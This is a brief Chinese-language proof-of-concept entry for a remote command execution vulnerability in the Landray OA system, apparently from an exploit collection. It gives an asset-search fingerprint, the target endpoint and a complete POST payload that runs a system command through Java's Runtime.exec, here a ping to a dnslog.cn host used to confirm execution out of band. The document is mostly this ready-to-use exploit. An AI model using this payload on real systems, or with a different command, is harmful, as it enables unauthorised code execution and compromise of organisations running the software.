# 蓝凌OAerp_data.jsp存在远程命令执行漏洞

蓝凌 ｜ 命令执行 ｜ —
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`

**Payload**
```
var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script=Runtime.getRuntime().exec("ping -c 4 abc123.dnslog.cn");
```
- **响应特征**：200 Dnslog回显